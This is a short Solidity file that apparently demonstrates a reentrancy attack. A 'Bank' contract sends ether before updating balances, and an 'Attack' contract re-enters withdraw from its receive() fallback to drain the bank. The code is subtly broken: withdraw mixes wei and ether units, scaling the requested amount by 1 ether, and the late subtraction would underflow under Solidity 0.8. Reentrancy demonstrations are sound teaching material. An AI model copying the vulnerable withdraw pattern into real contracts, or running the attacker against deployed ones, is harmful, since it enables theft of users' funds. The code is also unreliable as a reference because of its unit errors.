// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Bank {
    mapping(address => uint) balances;
    
    function deposit() external payable{
        balances[msg.sender]+=msg.value;
    }
    function getBalance() external view returns(uint) {
        return balances[msg.sender];
    }

    function withdraw(uint amount) external {
        require(balances[msg.sender]>=amount, "you aint that rich");
        
        (bool sent,) = msg.sender.call{value: amount * 1 ether}("");

        require(sent, "failed to send ether");
        
        balances[msg.sender]-=amount*1 ether;
    }

    receive() external payable{}
}

contract Attack {
    Bank bank;
    constructor(address _bankAddress) {
        bank = Bank(payable(_bankAddress));
    }
    uint amount=1 ether;
    function attack() external payable{
        require(msg.value >= amount, "Send at least 1 ether to attack");
        bank.deposit{value: amount}();
        bank.withdraw(amount);

    }
    receive() external payable {
        if (address(bank).balance >= amount) {
            bank.withdraw(amount);
        }    
    }
}


